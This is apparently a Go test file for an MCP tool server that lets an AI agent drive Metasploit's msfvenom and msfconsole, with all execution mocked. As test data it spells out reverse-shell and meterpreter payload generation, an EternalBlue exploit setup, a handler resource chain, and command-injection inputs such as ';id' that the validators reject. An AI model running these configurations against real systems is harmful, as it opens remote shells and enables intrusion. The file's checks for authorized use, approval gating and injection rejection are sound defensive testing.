package msf

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

func mustJSON(v any) json.RawMessage {
	b, _ := json.Marshal(v)
	return b
}

func runTool(t *testing.T, tool mcp.Tool, params any) *mcp.ToolResult {
	t.Helper()
	result, err := tool.Execute(context.Background(), mustJSON(params))
	if err != nil {
		t.Fatalf("Execute() returned error: %v", err)
	}
	if len(result.Content) == 0 {
		t.Fatal("Execute() returned empty content")
	}
	return result
}

func expectError(t *testing.T, result *mcp.ToolResult, wantSub string) {
	t.Helper()
	if !result.IsError {
		t.Fatalf("expected IsError=true, got success: %s", result.Content[0].Text)
	}
	if !strings.Contains(result.Content[0].Text, wantSub) {
		t.Errorf("error text should contain %q, got: %s", wantSub, result.Content[0].Text)
	}
}

// msfconsoleRCPath verifies the exact msfconsole argument list and returns
// the resource file path passed via -r.
func msfconsoleRCPath(t *testing.T, mock *executor.MockExecutor) string {
	t.Helper()
	if len(mock.Calls) != 1 {
		t.Fatalf("expected exactly 1 executor call, got %d", len(mock.Calls))
	}
	call := mock.Calls[0]
	if call.Binary != "msfconsole" {
		t.Fatalf("expected binary msfconsole, got %q", call.Binary)
	}
	if len(call.Args) != 3 || call.Args[0] != "-q" || call.Args[1] != "-r" {
		t.Fatalf("expected msfconsole args [-q -r <path>], got %v", call.Args)
	}
	return call.Args[2]
}

func readRCBytes(t *testing.T, path string) []byte {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("cannot read resource file %s: %v", path, err)
	}
	return data
}

func rcLines(t *testing.T, path string) []string {
	t.Helper()
	data := readRCBytes(t, path)
	lines := strings.Split(string(data), "\n")
	if len(lines) == 0 || lines[len(lines)-1] != "" {
		t.Fatalf("resource file %s must end with a newline, got %q", path, string(data))
	}
	return lines[:len(lines)-1]
}

func allTools(m *executor.MockExecutor) []mcp.Tool {
	return []mcp.Tool{
		NewPayloadGenerate(m),
		NewPayloadList(m),
		NewModuleInfo(m),
		NewModuleRun(m),
		NewResourceRun(m),
	}
}

// --- TestName ---

func TestName(t *testing.T) {
	mock := executor.NewMock()
	expected := []string{
		"msf_payload_generate",
		"msf_payload_list",
		"msf_module_info",
		"msf_module_run",
		"msf_resource_run",
	}
	for i, tool := range allTools(mock) {
		if tool.Name() != expected[i] {
			t.Errorf("tool %d Name() = %q, want %q", i, tool.Name(), expected[i])
		}
	}
}

// --- TestDescription ---

func TestDescription(t *testing.T) {
	mock := executor.NewMock()
	tools := allTools(mock)

	for _, tool := range tools {
		desc := tool.Description()
		if len(desc) < 40 {
			t.Errorf("%s Description() too short: %q", tool.Name(), desc)
		}
		if !strings.Contains(strings.ToLower(desc), "authorized") {
			t.Errorf("%s Description() must frame authorized use only, got: %s", tool.Name(), desc)
		}
	}

	byName := make(map[string]mcp.Tool)
	for _, tool := range tools {
		byName[tool.Name()] = tool
	}

	// High-impact tools must carry explicit warning and approval framing.
	for _, name := range []string{"msf_payload_generate", "msf_module_run"} {
		desc := byName[name].Description()
		if !strings.Contains(desc, "HIGH IMPACT") {
			t.Errorf("%s Description() must carry a HIGH IMPACT note, got: %s", name, desc)
		}
		if !strings.Contains(strings.ToLower(desc), "approval") {
			t.Errorf("%s Description() must state it is approval-gated, got: %s", name, desc)
		}
	}

	// Console tools must document the REDHANDS_TIMEOUT bound.
	for _, name := range []string{"msf_module_info", "msf_module_run", "msf_resource_run"} {
		if !strings.Contains(byName[name].Description(), "REDHANDS_TIMEOUT") {
			t.Errorf("%s Description() must document the REDHANDS_TIMEOUT bound", name)
		}
	}

	// The resource runner must warn about untrusted files.
	if !strings.Contains(byName["msf_resource_run"].Description(), "untrusted") {
		t.Error("msf_resource_run Description() must warn never to point it at untrusted files")
	}
}

// --- TestInputSchema ---

func TestInputSchema(t *testing.T) {
	mock := executor.NewMock()
	requiredByTool := map[string][]string{
		"msf_payload_generate": {"payload", "output"},
		"msf_payload_list":     nil,
		"msf_module_info":      {"module", "work_dir"},
		"msf_module_run":       {"module", "work_dir"},
		"msf_resource_run":     {"resource_file"},
	}

	for _, tool := range allTools(mock) {
		var parsed map[string]any
		if err := json.Unmarshal(tool.InputSchema(), &parsed); err != nil {
			t.Fatalf("%s InputSchema() is not valid JSON: %v", tool.Name(), err)
		}
		if parsed["type"] != "object" {
			t.Errorf("%s InputSchema() type = %v, want \"object\"", tool.Name(), parsed["type"])
		}
		if _, ok := parsed["properties"]; !ok {
			t.Errorf("%s InputSchema() missing \"properties\" key", tool.Name())
		}
		var required []string
		if raw, ok := parsed["required"].([]any); ok {
			for _, v := range raw {
				if s, ok := v.(string); ok {
					required = append(required, s)
				}
			}
		}
		want := requiredByTool[tool.Name()]
		if !reflect.DeepEqual(required, want) {
			t.Errorf("%s InputSchema() required = %v, want %v", tool.Name(), required, want)
		}
	}
}

// --- TestPayloadGenerateExactArgs ---

func TestPayloadGenerateExactArgs(t *testing.T) {
	dir := t.TempDir()
	out := filepath.Join(dir, "implant.elf")
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, args []string) []byte {
		for i, a := range args {
			if a == "-o" && i+1 < len(args) {
				_ = os.WriteFile(args[i+1], []byte("fake-payload-bytes"), 0o600)
			}
		}
		return []byte("Payload size: 18 bytes\n")
	}
	tool := NewPayloadGenerate(mock)

	result := runTool(t, tool, map[string]any{
		"payload":    "linux/x64/meterpreter/reverse_tcp",
		"options":    map[string]string{"LPORT": "4444", "LHOST": "10.0.0.1"}, // deliberately unsorted
		"format":     "elf",
		"output":     out,
		"arch":       "x64",
		"platform":   "linux",
		"encoder":    "x86/shikata_ga_nai",
		"iterations": 3,
		"badchars":   "\\x00\\xff",
		"nopsled":    16,
		"smallest":   true,
		"keep":       true,
	})
	if result.IsError {
		t.Fatalf("Execute() returned IsError=true: %s", result.Content[0].Text)
	}

	if len(mock.Calls) != 1 {
		t.Fatalf("expected exactly 1 executor call, got %d", len(mock.Calls))
	}
	call := mock.Calls[0]
	if call.Binary != "msfvenom" {
		t.Fatalf("expected binary msfvenom, got %q", call.Binary)
	}
	expected := []string{
		"-p", "linux/x64/meterpreter/reverse_tcp",
		// options sorted by key for determinism
		"LHOST=10.0.0.1", "LPORT=4444",
		"-f", "elf",
		"-o", out,
		"-a", "x64",
		"--platform", "linux",
		"-e", "x86/shikata_ga_nai",
		"-i", "3",
		"-b", "\\x00\\xff",
		"-n", "16",
		"--smallest",
		"--keep",
	}
	if !reflect.DeepEqual(call.Args, expected) {
		t.Errorf("msfvenom args mismatch:\n got: %v\nwant: %v", call.Args, expected)
	}
}

// --- TestPayloadGenerateMinimal ---

func TestPayloadGenerateMinimal(t *testing.T) {
	dir := t.TempDir()
	out := filepath.Join(dir, "shell.bin")
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, args []string) []byte {
		for i, a := range args {
			if a == "-o" && i+1 < len(args) {
				_ = os.WriteFile(args[i+1], []byte("x"), 0o600)
			}
		}
		return []byte("Payload size: 1 bytes\n")
	}
	tool := NewPayloadGenerate(mock)

	result := runTool(t, tool, map[string]any{
		"payload": "cmd/unix/reverse_bash",
		"output":  out,
	})
	if result.IsError {
		t.Fatalf("Execute() returned IsError=true: %s", result.Content[0].Text)
	}

	call := mock.LastCall()
	expected := []string{"-p", "cmd/unix/reverse_bash", "-o", out}
	if !reflect.DeepEqual(call.Args, expected) {
		t.Errorf("msfvenom args mismatch:\n got: %v\nwant: %v", call.Args, expected)
	}
}

// --- TestPayloadGenerateResultReport ---

func TestPayloadGenerateResultReport(t *testing.T) {
	dir := t.TempDir()
	out := filepath.Join(dir, "implant.exe")
	payloadBytes := []byte("MZ-fake-payload-for-hashing")
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, args []string) []byte {
		for i, a := range args {
			if a == "-o" && i+1 < len(args) {
				_ = os.WriteFile(args[i+1], payloadBytes, 0o600)
			}
		}
		return []byte("Payload size: 29 bytes\nSaved as: " + out + "\n")
	}
	tool := NewPayloadGenerate(mock)

	result := runTool(t, tool, map[string]any{
		"payload": "windows/x64/shell_reverse_tcp",
		"format":  "exe-x64",
		"output":  out,
	})
	if result.IsError {
		t.Fatalf("Execute() returned IsError=true: %s", result.Content[0].Text)
	}

	sum := sha256.Sum256(payloadBytes)
	text := result.Content[0].Text
	for _, want := range []string{
		out,
		hex.EncodeToString(sum[:]),
		fmt.Sprintf("**Size**: %d bytes", len(payloadBytes)),
		"**SHA-256**",
	} {
		if !strings.Contains(text, want) {
			t.Errorf("result text should contain %q, got: %s", want, text)
		}
	}
}

// --- TestPayloadList ---

func TestPayloadList(t *testing.T) {
	for _, tc := range []struct {
		name   string
		params map[string]any
		want   []string
	}{
		{"default kind", map[string]any{}, []string{"--list", "payloads"}},
		{"explicit payloads", map[string]any{"kind": "payloads"}, []string{"--list", "payloads"}},
		{"encoders", map[string]any{"kind": "encoders"}, []string{"--list", "encoders"}},
		{"formats", map[string]any{"kind": "formats"}, []string{"--list", "formats"}},
		{"platforms", map[string]any{"kind": "platforms"}, []string{"--list", "platforms"}},
		{"archs", map[string]any{"kind": "archs"}, []string{"--list", "archs"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			mock := executor.NewMock()
			mock.StdoutFn = func(_ string, _ []string) []byte {
				return []byte("linux/x64/meterpreter/reverse_tcp\n")
			}
			result := runTool(t, NewPayloadList(mock), tc.params)
			if result.IsError {
				t.Fatalf("Execute() returned IsError=true: %s", result.Content[0].Text)
			}
			call := mock.LastCall()
			if call.Binary != "msfvenom" {
				t.Fatalf("expected binary msfvenom, got %q", call.Binary)
			}
			if !reflect.DeepEqual(call.Args, tc.want) {
				t.Errorf("args = %v, want %v", call.Args, tc.want)
			}
			if !strings.Contains(result.Content[0].Text, "linux/x64/meterpreter/reverse_tcp") {
				t.Errorf("result should include listing output, got: %s", result.Content[0].Text)
			}
		})
	}
}

// --- TestModuleInfo ---

func TestModuleInfo(t *testing.T) {
	workDir := t.TempDir()
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("Name: Multi Handler\nRank: Excellent\n")
	}
	tool := NewModuleInfo(mock)

	result := runTool(t, tool, map[string]any{
		"module":   "exploit/multi/handler",
		"work_dir": workDir,
	})
	if result.IsError {
		t.Fatalf("Execute() returned IsError=true: %s", result.Content[0].Text)
	}

	rcPath := msfconsoleRCPath(t, mock)
	if !strings.HasPrefix(rcPath, workDir) {
		t.Errorf("resource file should land inside work_dir, got %s", rcPath)
	}
	if !strings.HasPrefix(filepath.Base(rcPath), "info-") || !strings.HasSuffix(rcPath, ".rc") {
		t.Errorf("resource file should be named info-<rand>.rc, got %s", rcPath)
	}

	expectedLines := []string{"use exploit/multi/handler", "show info", "exit"}
	if lines := rcLines(t, rcPath); !reflect.DeepEqual(lines, expectedLines) {
		t.Errorf("resource file content mismatch:\n got: %q\nwant: %q", lines, expectedLines)
	}

	info, err := os.Stat(rcPath)
	if err != nil {
		t.Fatalf("cannot stat resource file: %v", err)
	}
	if info.Mode().Perm() != 0o600 {
		t.Errorf("resource file mode = %v, want 0600", info.Mode().Perm())
	}

	text := result.Content[0].Text
	for _, want := range []string{"exploit/multi/handler", "Name: Multi Handler"} {
		if !strings.Contains(text, want) {
			t.Errorf("result text should contain %q, got: %s", want, text)
		}
	}
}

// --- TestModuleRun ---

func TestModuleRun(t *testing.T) {
	tests := []struct {
		name         string
		params       map[string]any
		expectedLine []string
	}{
		{
			name: "full options with exploit-job",
			params: map[string]any{
				"module":         "exploit/windows/smb/ms17_010_eternalblue",
				"options":        map[string]string{"RHOSTS": "10.0.0.5", "LHOST": "10.0.0.1"}, // unsorted on purpose
				"global_options": map[string]string{"LPORT": "4444"},
				"run_mode":       "exploit-job",
				"work_dir":       "WORKDIR",
			},
			expectedLine: []string{
				"use exploit/windows/smb/ms17_010_eternalblue",
				"set LHOST 10.0.0.1",
				"set RHOSTS 10.0.0.5",
				"setg LPORT 4444",
				"exploit -j",
				"exit",
			},
		},
		{
			name: "default run mode",
			params: map[string]any{
				"module":   "auxiliary/scanner/portscan/tcp",
				"options":  map[string]string{"RHOSTS": "10.0.0.0/24", "PORTS": "22,443"},
				"work_dir": "WORKDIR",
			},
			expectedLine: []string{
				"use auxiliary/scanner/portscan/tcp",
				"set PORTS 22,443",
				"set RHOSTS 10.0.0.0/24",
				"run",
				"exit",
			},
		},
		{
			name: "exploit run mode",
			params: map[string]any{
				"module":   "exploit/multi/handler",
				"run_mode": "exploit",
				"work_dir": "WORKDIR",
			},
			expectedLine: []string{
				"use exploit/multi/handler",
				"exploit",
				"exit",
			},
		},
		{
			name: "post module",
			params: map[string]any{
				"module":   "post/multi/manage/shell_to_meterpreter",
				"options":  map[string]string{"SESSION": "1"},
				"work_dir": "WORKDIR",
			},
			expectedLine: []string{
				"use post/multi/manage/shell_to_meterpreter",
				"set SESSION 1",
				"run",
				"exit",
			},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			workDir := t.TempDir()
			tc.params["work_dir"] = workDir

			mock := executor.NewMock()
			mock.StdoutFn = func(_ string, _ []string) []byte {
				return []byte("[*] Started reverse TCP handler\n")
			}
			result := runTool(t, NewModuleRun(mock), tc.params)
			if result.IsError {
				t.Fatalf("Execute() returned IsError=true: %s", result.Content[0].Text)
			}

			rcPath := msfconsoleRCPath(t, mock)
			if !strings.HasPrefix(filepath.Base(rcPath), "run-") || !strings.HasSuffix(rcPath, ".rc") {
				t.Errorf("resource file should be named run-<rand>.rc, got %s", rcPath)
			}
			if lines := rcLines(t, rcPath); !reflect.DeepEqual(lines, tc.expectedLine) {
				t.Errorf("resource file content mismatch:\n got: %q\nwant: %q", lines, tc.expectedLine)
			}
			if !strings.Contains(result.Content[0].Text, rcPath) {
				t.Errorf("result should report the resource file path for audit, got: %s", result.Content[0].Text)
			}
		})
	}
}

// --- TestResourceRun ---

func TestResourceRun(t *testing.T) {
	dir := t.TempDir()
	rc := filepath.Join(dir, "chain.rc")
	content := "use exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nexploit -j\nexit\n"
	if err := os.WriteFile(rc, []byte(content), 0o600); err != nil {
		t.Fatalf("cannot write test resource file: %v", err)
	}

	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, _ []string) []byte {
		return []byte("[*] Sending stage\n")
	}
	tool := NewResourceRun(mock)

	result := runTool(t, tool, map[string]any{"resource_file": rc})
	if result.IsError {
		t.Fatalf("Execute() returned IsError=true: %s", result.Content[0].Text)
	}

	if len(mock.Calls) != 1 {
		t.Fatalf("expected exactly 1 executor call, got %d", len(mock.Calls))
	}
	call := mock.Calls[0]
	if call.Binary != "msfconsole" {
		t.Fatalf("expected binary msfconsole, got %q", call.Binary)
	}
	expected := []string{"-q", "-r", rc}
	if !reflect.DeepEqual(call.Args, expected) {
		t.Errorf("msfconsole args = %v, want %v", call.Args, expected)
	}
	if !strings.Contains(result.Content[0].Text, "[*] Sending stage") {
		t.Errorf("result should include console output, got: %s", result.Content[0].Text)
	}
}

// --- TestWorkDirCreated ---

func TestWorkDirCreated(t *testing.T) {
	nested := filepath.Join(t.TempDir(), "nested", "msf-work")
	mock := executor.NewMock()
	tool := NewModuleInfo(mock)

	result := runTool(t, tool, map[string]any{
		"module":   "auxiliary/scanner/portscan/tcp",
		"work_dir": nested,
	})
	if result.IsError {
		t.Fatalf("Execute() returned IsError=true: %s", result.Content[0].Text)
	}
	info, err := os.Stat(nested)
	if err != nil {
		t.Fatalf("work_dir should have been created: %v", err)
	}
	if !info.IsDir() {
		t.Error("work_dir should be a directory")
	}
	if info.Mode().Perm() != 0o700 {
		t.Errorf("created work_dir mode = %v, want 0700", info.Mode().Perm())
	}
}

// --- TestResourceFileDeterminism ---

func TestResourceFileDeterminism(t *testing.T) {
	params := func(workDir string) map[string]any {
		return map[string]any{
			"module":         "exploit/multi/handler",
			"options":        map[string]string{"LHOST": "10.0.0.1", "LPORT": "4444"},
			"global_options": map[string]string{"EXITFUNC": "process"},
			"work_dir":       workDir,
		}
	}

	// Same module_run input twice: identical .rc bytes (only the random file
	// name differs).
	var runs [][]byte
	for i := 0; i < 2; i++ {
		mock := executor.NewMock()
		result := runTool(t, NewModuleRun(mock), params(t.TempDir()))
		if result.IsError {
			t.Fatalf("run %d returned IsError=true: %s", i, result.Content[0].Text)
		}
		runs = append(runs, readRCBytes(t, msfconsoleRCPath(t, mock)))
	}
	if !reflect.DeepEqual(runs[0], runs[1]) {
		t.Errorf("same module_run input produced different .rc content:\n%q\n%q", runs[0], runs[1])
	}

	// Same module_info input twice: identical .rc bytes.
	var infos [][]byte
	for i := 0; i < 2; i++ {
		mock := executor.NewMock()
		result := runTool(t, NewModuleInfo(mock), map[string]any{
			"module":   "payload/cmd/unix/reverse_bash",
			"work_dir": t.TempDir(),
		})
		if result.IsError {
			t.Fatalf("info run %d returned IsError=true: %s", i, result.Content[0].Text)
		}
		infos = append(infos, readRCBytes(t, msfconsoleRCPath(t, mock)))
	}
	if !reflect.DeepEqual(infos[0], infos[1]) {
		t.Errorf("same module_info input produced different .rc content:\n%q\n%q", infos[0], infos[1])
	}
}

// --- TestPayloadGenerateInvalid ---

func TestPayloadGenerateInvalid(t *testing.T) {
	dir := t.TempDir()
	out := filepath.Join(dir, "implant.bin")
	if err := os.WriteFile(filepath.Join(dir, "existing.rc"), []byte("exit\n"), 0o600); err != nil {
		t.Fatalf("setup: %v", err)
	}
	if err := os.Mkdir(filepath.Join(dir, "sub"), 0o755); err != nil {
		t.Fatalf("setup: %v", err)
	}

	tests := []struct {
		name    string
		params  map[string]any
		wantSub string
	}{
		{"missing payload", map[string]any{"output": out}, "payload is required"},
		{"uppercase payload", map[string]any{"payload": "Linux/x64/shell_reverse_tcp", "output": out}, "payload must match"},
		{"payload with space", map[string]any{"payload": "linux/x64/shell reverse_tcp", "output": out}, "payload must match"},
		{"payload metachar", map[string]any{"payload": "linux/x64/shell;id", "output": out}, "payload must match"},
		{"bad option key starts with digit", map[string]any{"payload": "cmd/unix/reverse_bash", "output": out, "options": map[string]string{"1BAD": "x"}}, "key"},
		{"bad option key with dash", map[string]any{"payload": "cmd/unix/reverse_bash", "output": out, "options": map[string]string{"L-HOST": "x"}}, "key"},
		{"empty option value", map[string]any{"payload": "cmd/unix/reverse_bash", "output": out, "options": map[string]string{"LHOST": ""}}, "must not be empty"},
		{"bad format", map[string]any{"payload": "cmd/unix/reverse_bash", "output": out, "format": "exe2"}, "invalid format"},
		{"format not in enum case", map[string]any{"payload": "cmd/unix/reverse_bash", "output": out, "format": "ELF"}, "invalid format"},
		{"bad arch", map[string]any{"payload": "cmd/unix/reverse_bash", "output": out, "arch": "x128"}, "invalid arch"},
		{"bad platform charset", map[string]any{"payload": "cmd/unix/reverse_bash", "output": out, "platform": "linux windows"}, "invalid platform"},
		{"platform metachar", map[string]any{"payload": "cmd/unix/reverse_bash", "output": out, "platform": "linux;id"}, "invalid platform"},
		{"bad encoder", map[string]any{"payload": "cmd/unix/reverse_bash", "output": out, "encoder": "x86/shikata ga_nai"}, "encoder must match"},
		{"iterations negative", map[string]any{"payload": "cmd/unix/reverse_bash", "output": out, "iterations": -1}, "iterations"},
		{"iterations too high", map[string]any{"payload": "cmd/unix/reverse_bash", "output": out, "iterations": 21}, "iterations"},
		{"nopsled negative", map[string]any{"payload": "cmd/unix/reverse_bash", "output": out, "nopsled": -1}, "nopsled"},
		{"nopsled too high", map[string]any{"payload": "cmd/unix/reverse_bash", "output": out, "nopsled": 257}, "nopsled"},
		{"badchars without escapes", map[string]any{"payload": "cmd/unix/reverse_bash", "output": out, "badchars": "00ff"}, "badchars"},
		{"badchars short escape", map[string]any{"payload": "cmd/unix/reverse_bash", "output": out, "badchars": "\\x0"}, "badchars"},
		{"badchars non-hex", map[string]any{"payload": "cmd/unix/reverse_bash", "output": out, "badchars": "\\xg1"}, "badchars"},
		{"missing output", map[string]any{"payload": "cmd/unix/reverse_bash"}, "output is required"},
		{"output in nonexistent dir", map[string]any{"payload": "cmd/unix/reverse_bash", "output": "/nonexistent-msf-dir/implant.bin"}, "parent directory does not exist"},
		{"output ends in .rc", map[string]any{"payload": "cmd/unix/reverse_bash", "output": filepath.Join(dir, "existing.rc")}, ".rc"},
		{"output ends in .RC", map[string]any{"payload": "cmd/unix/reverse_bash", "output": filepath.Join(dir, "existing.RC")}, ".rc"},
		{"output is a directory", map[string]any{"payload": "cmd/unix/reverse_bash", "output": filepath.Join(dir, "sub")}, "directory"},
		{"output metachar", map[string]any{"payload": "cmd/unix/reverse_bash", "output": filepath.Join(dir, "a;b.bin")}, "forbidden character"},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			mock := executor.NewMock()
			result := runTool(t, NewPayloadGenerate(mock), tc.params)
			expectError(t, result, tc.wantSub)
			if len(mock.Calls) != 0 {
				t.Errorf("no executor call expected on invalid input, got %v", mock.Calls)
			}
		})
	}
}

// --- TestModuleInfoInvalid ---

func TestModuleInfoInvalid(t *testing.T) {
	workDir := t.TempDir()
	tests := []struct {
		name    string
		params  map[string]any
		wantSub string
	}{
		{"missing module", map[string]any{"work_dir": workDir}, "module is required"},
		{"missing work_dir", map[string]any{"module": "exploit/multi/handler"}, "work_dir is required"},
		{"module without slash", map[string]any{"module": "multihandler", "work_dir": workDir}, "module must match"},
		{"module bad prefix", map[string]any{"module": "scanner/portscan/tcp", "work_dir": workDir}, "module must match"},
		{"module uppercase", map[string]any{"module": "EXPLOIT/multi/handler", "work_dir": workDir}, "module must match"},
		{"module metachar", map[string]any{"module": "exploit/multi/handler;id", "work_dir": workDir}, "module must match"},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			mock := executor.NewMock()
			result := runTool(t, NewModuleInfo(mock), tc.params)
			expectError(t, result, tc.wantSub)
			if len(mock.Calls) != 0 {
				t.Errorf("no executor call expected on invalid input, got %v", mock.Calls)
			}
		})
	}
}

// --- TestModuleRunInvalid ---

func TestModuleRunInvalid(t *testing.T) {
	workDir := t.TempDir()
	workFile := filepath.Join(t.TempDir(), "not-a-dir")
	if err := os.WriteFile(workFile, []byte("x"), 0o600); err != nil {
		t.Fatalf("setup: %v", err)
	}

	tests := []struct {
		name    string
		params  map[string]any
		wantSub string
	}{
		{"missing module", map[string]any{"work_dir": workDir}, "module is required"},
		{"missing work_dir", map[string]any{"module": "exploit/multi/handler"}, "work_dir is required"},
		{"payload module not runnable", map[string]any{"module": "payload/cmd/unix/reverse_bash", "work_dir": workDir}, "module must match"},
		{"encoder module not runnable", map[string]any{"module": "encoder/x86/shikata_ga_nai", "work_dir": workDir}, "module must match"},
		{"bad run mode", map[string]any{"module": "exploit/multi/handler", "work_dir": workDir, "run_mode": "exploit -z"}, "run_mode"},
		{"bad option key", map[string]any{"module": "exploit/multi/handler", "work_dir": workDir, "options": map[string]string{"R HOSTS": "10.0.0.1"}}, "key"},
		{"bad global option key", map[string]any{"module": "exploit/multi/handler", "work_dir": workDir, "global_options": map[string]string{"R-HOST": "10.0.0.1"}}, "key"},
		{"empty option value", map[string]any{"module": "exploit/multi/handler", "work_dir": workDir, "options": map[string]string{"RHOSTS": ""}}, "must not be empty"},
		{"work_dir is a file", map[string]any{"module": "exploit/multi/handler", "work_dir": workFile}, "not a directory"},
		{"work_dir metachar", map[string]any{"module": "exploit/multi/handler", "work_dir": "/tmp/a(b"}, "forbidden character"},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			mock := executor.NewMock()
			result := runTool(t, NewModuleRun(mock), tc.params)
			expectError(t, result, tc.wantSub)
			if len(mock.Calls) != 0 {
				t.Errorf("no executor call expected on invalid input, got %v", mock.Calls)
			}
		})
	}
}

// --- TestResourceRunInvalid ---

func TestResourceRunInvalid(t *testing.T) {
	dir := t.TempDir()
	existing := filepath.Join(dir, "chain.rc")
	if err := os.WriteFile(existing, []byte("exit\n"), 0o600); err != nil {
		t.Fatalf("setup: %v", err)
	}
	nonRC := filepath.Join(dir, "chain.txt")
	if err := os.WriteFile(nonRC, []byte("exit\n"), 0o600); err != nil {
		t.Fatalf("setup: %v", err)
	}
	rcDir := filepath.Join(dir, "dir.rc")
	if err := os.Mkdir(rcDir, 0o755); err != nil {
		t.Fatalf("setup: %v", err)
	}

	tests := []struct {
		name    string
		params  map[string]any
		wantSub string
	}{
		{"missing resource_file", map[string]any{}, "resource_file is required"},
		{"nonexistent file", map[string]any{"resource_file": filepath.Join(dir, "nope.rc")}, "does not exist"},
		{"non-.rc file", map[string]any{"resource_file": nonRC}, "must end in .rc"},
		{"directory ending in .rc", map[string]any{"resource_file": rcDir}, "is a directory"},
		{"metachar path", map[string]any{"resource_file": "/tmp/a;b.rc"}, "forbidden character"},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			mock := executor.NewMock()
			result := runTool(t, NewResourceRun(mock), tc.params)
			expectError(t, result, tc.wantSub)
			if len(mock.Calls) != 0 {
				t.Errorf("no executor call expected on invalid input, got %v", mock.Calls)
			}
		})
	}

	// Sanity: the valid file still works after all the rejections above.
	mock := executor.NewMock()
	result := runTool(t, NewResourceRun(mock), map[string]any{"resource_file": existing})
	if result.IsError {
		t.Fatalf("valid resource file should run, got: %s", result.Content[0].Text)
	}
}

// --- TestMetacharsRejected ---

// TestMetacharsRejected walks the executor's full forbidden-character set
// through every free-form string surface of the msf tools.
func TestMetacharsRejected(t *testing.T) {
	forbidden := []string{";", "|", "&", "`", "$", "(", ")", "{", "}", "<", ">", "!", "\n", "\r"}

	for _, mc := range forbidden {
		t.Run("option value "+fmt.Sprintf("%q", mc), func(t *testing.T) {
			mock := executor.NewMock()
			result := runTool(t, NewPayloadGenerate(mock), map[string]any{
				"payload": "cmd/unix/reverse_bash",
				"output":  filepath.Join(t.TempDir(), "out.bin"),
				"options": map[string]string{"LHOST": "1.2.3.4" + mc + "id"},
			})
			expectError(t, result, "forbidden character")
			if len(mock.Calls) != 0 {
				t.Errorf("no executor call expected, got %v", mock.Calls)
			}
		})
		t.Run("module_run option value "+fmt.Sprintf("%q", mc), func(t *testing.T) {
			mock := executor.NewMock()
			result := runTool(t, NewModuleRun(mock), map[string]any{
				"module":   "exploit/multi/handler",
				"work_dir": t.TempDir(),
				"options":  map[string]string{"RHOSTS": "10.0.0.1" + mc + "id"},
			})
			expectError(t, result, "forbidden character")
		})
		t.Run("module_run global option value "+fmt.Sprintf("%q", mc), func(t *testing.T) {
			mock := executor.NewMock()
			result := runTool(t, NewModuleRun(mock), map[string]any{
				"module":         "exploit/multi/handler",
				"work_dir":       t.TempDir(),
				"global_options": map[string]string{"LHOST": "1.2.3.4" + mc + "id"},
			})
			expectError(t, result, "forbidden character")
		})
		t.Run("module_run work_dir "+fmt.Sprintf("%q", mc), func(t *testing.T) {
			mock := executor.NewMock()
			result := runTool(t, NewModuleRun(mock), map[string]any{
				"module":   "exploit/multi/handler",
				"work_dir": "/tmp/msf" + mc + "wd",
			})
			expectError(t, result, "forbidden character")
		})
		t.Run("resource_file path "+fmt.Sprintf("%q", mc), func(t *testing.T) {
			mock := executor.NewMock()
			result := runTool(t, NewResourceRun(mock), map[string]any{
				"resource_file": "/tmp/x" + mc + "y.rc",
			})
			expectError(t, result, "forbidden character")
		})
	}
}

// --- TestBadcharsAccepted ---

// TestBadcharsAccepted pins that backslash hex escapes — the one payload
// surface that legitimately contains backslashes — pass validation.
func TestBadcharsAccepted(t *testing.T) {
	dir := t.TempDir()
	out := filepath.Join(dir, "implant.bin")
	mock := executor.NewMock()
	mock.StdoutFn = func(_ string, args []string) []byte {
		for i, a := range args {
			if a == "-o" && i+1 < len(args) {
				_ = os.WriteFile(args[i+1], []byte("x"), 0o600)
			}
		}
		return []byte("ok\n")
	}
	result := runTool(t, NewPayloadGenerate(mock), map[string]any{
		"payload":  "windows/x64/shell_reverse_tcp",
		"badchars": "\\x00\\x0a\\xff",
		"output":   out,
	})
	if result.IsError {
		t.Fatalf("valid badchars rejected: %s", result.Content[0].Text)
	}
	call := mock.LastCall()
	found := false
	for _, a := range call.Args {
		if a == "\\x00\\x0a\\xff" {
			found = true
		}
	}
	if !found {
		t.Errorf("badchars arg not passed to msfvenom, args: %v", call.Args)
	}
}
